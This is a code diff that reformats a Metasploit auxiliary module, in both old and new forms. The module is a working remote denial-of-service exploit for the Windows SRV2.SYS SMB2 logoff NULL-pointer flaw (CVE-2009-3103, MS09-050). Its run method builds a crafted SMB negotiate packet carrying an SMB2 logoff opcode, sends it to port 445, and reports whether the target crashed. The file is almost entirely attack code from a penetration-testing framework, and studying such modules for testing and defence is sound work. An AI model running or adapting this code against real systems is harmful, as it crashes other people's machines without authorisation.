@@ -1,78 +1,65 @@
 ##
-# $Id$
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
-##
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::Tcp
+  include Msf::Auxiliary::Dos
 
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference',
+      'Description'    => %q{
+        This module triggers a NULL pointer dereference in the SRV2.SYS kernel driver when processing
+        an SMB2 logoff request before a session has been correctly negotiated, resulting in a BSOD.
+        Effecting Vista SP1/SP2 (And possibly Server 2008 SP1/SP2), the flaw was resolved with MS09-050.
+      },
+      'Author'         => [ 'sf' ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          [ 'CVE', '2009-3103'],
+          [ 'OSVDB', '57799' ],
+          [ 'MSB', 'MS09-050' ],
+        ]
+    ))
 
-require 'msf/core'
+    register_options( [ Opt::RPORT( 445 ) ])
+  end
 
+  def run
+    print_status( "Targeting host #{datastore['RHOST']}:#{datastore['RPORT']}..." )
+    connect
 
-class Metasploit3 < Msf::Auxiliary
+    dialects = [ "AAAA" + [ 0xDEADC0DE ].pack( "V" ) + [ 0xCAFEF00D ].pack( "V" ), "SMB 2.002" ]
 
-	include Msf::Exploit::Remote::Tcp
-	include Msf::Auxiliary::Dos
+    data  = dialects.collect { |dialect| "\x02" + dialect + "\x00" }.join( '' )
+    data += "A" * 128
 
-	def initialize(info = {})
-		super(update_info(info,
-			'Name'           => 'Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference',
-			'Description'    => %q{
-				This module triggers a NULL pointer dereference in the SRV2.SYS kernel driver when processing
-				an SMB2 logoff request before a session has been correctly negotiated, resulting in a BSOD.
-				Effecting Vista SP1/SP2 (And possibly Server 2008 SP1/SP2), the flaw was resolved with MS09-050.
-			},
-			'Author'         => [ 'sf' ],
-			'License'        => MSF_LICENSE,
-			'Version'        => '$Revision$',
-			'References'     =>
-				[
-					[ 'CVE', '2009-3103'],
-					[ 'OSVDB', '57799' ],
-					[ 'MSB', 'MS09-050' ],
-				]
-		))
+    packet = Rex::Proto::SMB::Constants::SMB_NEG_PKT.make_struct
 
-		register_options( [ Opt::RPORT( 445 ) ], self.class )
-	end
+    packet['Payload']['SMB'].v['Command']       = Rex::Proto::SMB::Constants::SMB_COM_NEGOTIATE
+    packet['Payload']['SMB'].v['Flags1']        = 0x18
+    packet['Payload']['SMB'].v['Flags2']        = 0xC853
+    packet['Payload']['SMB'].v['ProcessIDHigh'] = Rex::Proto::SMB::Constants::SMB2_OP_LOGOFF
+    packet['Payload'].v['Payload']              = data
 
-	def run
-		print_status( "Targeting host #{datastore['RHOST']}:#{datastore['RPORT']}..." )
-		connect
+    packet = packet.to_s
 
-		dialects = [ "AAAA" + [ 0xDEADC0DE ].pack( "V" ) + [ 0xCAFEF00D ].pack( "V" ), "SMB 2.002" ]
+    print_status( "Sending the exploit packet (#{packet.length} bytes)..." )
+    sock.put( packet )
 
-		data  = dialects.collect { |dialect| "\x02" + dialect + "\x00" }.join( '' )
-		data += "A" * 128
+    response = sock.get_once
 
-		packet = Rex::Proto::SMB::Constants::SMB_NEG_PKT.make_struct
+    if( not response )
+      print_status( "No response. The target system has probably crashed." )
+    else
+      print_status( "Response received. The target system is not vulnerable:\n#{response.inspect}" )
+    end
 
-		packet['Payload']['SMB'].v['Command']       = Rex::Proto::SMB::Constants::SMB_COM_NEGOTIATE
-		packet['Payload']['SMB'].v['Flags1']        = 0x18
-		packet['Payload']['SMB'].v['Flags2']        = 0xC853
-		packet['Payload']['SMB'].v['ProcessIDHigh'] = Rex::Proto::SMB::Constants::SMB2_OP_LOGOFF
-		packet['Payload'].v['Payload']              = data
-
-		packet = packet.to_s
-
-		print_status( "Sending the exploit packet (#{packet.length} bytes)..." )
-		sock.put( packet )
-
-		response = sock.get_once
-
-		if( not response )
-			print_status( "No response. The target system has probably crashed." )
-		else
-			print_status( "Response received. The target system is not vulnerable:\n#{response.inspect}" )
-		end
-
-		disconnect
-	end
-
+    disconnect
+  end
 end
 
 =begin
